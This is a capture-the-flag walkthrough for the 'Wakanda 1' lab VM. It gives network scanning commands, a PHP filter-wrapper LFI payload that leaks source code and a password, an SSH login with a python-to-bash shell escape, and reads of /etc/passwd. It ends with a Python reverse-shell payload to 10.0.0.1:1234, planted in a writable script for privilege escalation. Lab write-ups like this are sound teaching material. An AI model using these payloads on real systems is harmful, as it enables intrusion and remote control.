# Wakanda 1


## [step 1] Finding Ip Address

> nmap nmap -sT 192.168.0.0/24 
>
> netdiscover -r 192.168.0.0/24 \
>
> arp-scan -l

## [step 2] Finding Port 
> nmap [nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.56.101]
>
> nikto [nikto -h 192.168.56.101]

## [step 3] Directory
> directory buster [dirb  192.168.156.101]
>
> nikto [nikto -h 192.168.56.101]

## [step 4] web pages analysis and decoding
> curl 
>
> curl -I 192.168.56.101/fr.php
>
> curl -I 192.168.56.101/index.php
### As there was this in line in source page :  <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
#### The commented HTML seems to suggest LFI vulnerability is present with the lang parameter.
#### So try this: 
> [http://192.168.56.101/index.php] this is homepage.So we'll try  LFI/RFI attack,using Wrappers.
Wrapper php://filter
- http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
- http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
- http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

> After [http://192.168.56.101/index.php?lang=php://filter/convert.base64-encode/resource=index]
>
#### there are  encoded words.

> According to PHP official documentation, PHP supports four categories of filters.
>

   - String Filters
   - Conversion Filters
   - Compression Filters
   - Encryption Filters

##### Of the above, base64-encode filter from the conversion filter can be used to retrieve arbitrary server file through LFI. It is also possible to use zlib.inflate or bzip2.compress from the compression filters to retrieve server files without executing them. But I prefer to use base64-encode because of its ease of use

> curl http://192.168.56.101/index.php?lang=php://filter/convert.base64-encode/resource=index | head -n 1 | base64 -d
>
#### We'll get php code in which there is password.

## [Step 5] ssh
> try login through ssh
>
> ssh -p3333 mamadou@192.168.56.101

### we'll get a python shell after login

``` 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

> try to get bash shell by python command : [>>> import os; os.system("/bin/bash")
]
```
mamadou@Wakanda1:~$ ls
flag1.txt
mamadou@Wakanda1:~$ cat flag.txt
cat: flag.txt: No such file or directory
mamadou@Wakanda1:~$ cat flag1.txt

Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
mamadou@Wakanda1:~$ ls
flag1.txt
mamadou@Wakanda1:~$ ls -la
total 24
drwxr-xr-x 2 mamadou mamadou 4096 Aug  5 02:24 .
drwxr-xr-x 4 root    root    4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root    root       9 Aug  5 02:24 .bash_history -> /dev/null
-rw-r--r-- 1 mamadou mamadou  220 Aug  1 13:15 .bash_logout
-rw-r--r-- 1 mamadou mamadou 3515 Aug  1 13:15 .bashrc
-rw-r--r-- 1 mamadou mamadou   41 Aug  1 15:52 flag1.txt
-rw-r--r-- 1 mamadou mamadou  675 Aug  1 13:15 .profile
mamadou@Wakanda1:~$ pwd
/home/mamadou
```
```
mamadou@Wakanda1:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/python
devops:x:1001:1002:,,,:/home/devops:/bin/bash
mamadou@Wakanda1:~$ cat flag1.txt

Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
mamadou@Wakanda1:~$ locate flag2.txt
/home/devops/flag2.txt
mamadou@Wakanda1:~$ cat /home/devops/flag2.txt
cat: /home/devops/flag2.txt: Permission denied
mamadou@Wakanda1:~$ ls -al /home/devops/
total 24
drwxr-xr-x 2 devops developer 4096 Aug  5 02:25 .
drwxr-xr-x 4 root   root      4096 Aug  1 15:23 ..
lrwxrwxrwx 1 root   root         9 Aug  5 02:25 .bash_history -> /dev/null
-rw-r--r-- 1 devops developer  220 Aug  1 15:23 .bash_logout
-rw-r--r-- 1 devops developer 3515 Aug  1 15:23 .bashrc
-rw-r----- 1 devops developer   42 Aug  1 15:57 flag2.txt
-rw-r--r-- 1 devops developer  675 Aug  1 15:23 .profile
mamadou@Wakanda1:~$ id
uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)
mamadou@Wakanda1:~$ 
```
> locate flag2.txt by typing [ locate flag2.txt ] 
>
> find devops user by typing [ find / -user devops ]
>
> we'll get many file directories but all are Permission Denied.
>
> in the first line we got [/srv/.antivirus.py]
>
> try to get into that directory.
>
```
mamadou@Wakanda1:~$ ls -al /srv
total 12
drwxr-xr-x  2 root   root      4096 Aug  1 17:52 .
drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..
-rw-r--rw-  1 devops developer   36 Aug  1 20:08 .antivirus.py
mamadou@Wakanda1:~$ more /srv/.antivirus.py
open('/tmp/test','w').write('test')
```
> when this script is ran this will write to /temp/test,the temp folder is used for startup functionality. to get access use shell.
>
> try using python shell.
>
```
open('/tmp/test','w').write('test')

import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",1234)) 
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])  
```







